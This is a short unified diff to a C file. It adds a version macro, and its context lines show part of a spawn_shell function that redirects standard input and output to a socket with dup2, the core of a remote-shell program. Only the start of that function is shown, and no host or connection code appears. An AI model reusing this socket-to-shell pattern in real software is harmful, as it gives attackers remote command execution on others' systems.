@@ -9,6 +9,8 @@
 #include <fcntl.h>
 #include <errno.h>
 
+#define version 0.0.1
+
 void spawn_shell(int socket) {
   dup2(socket,0);
   dup2(socket,1);
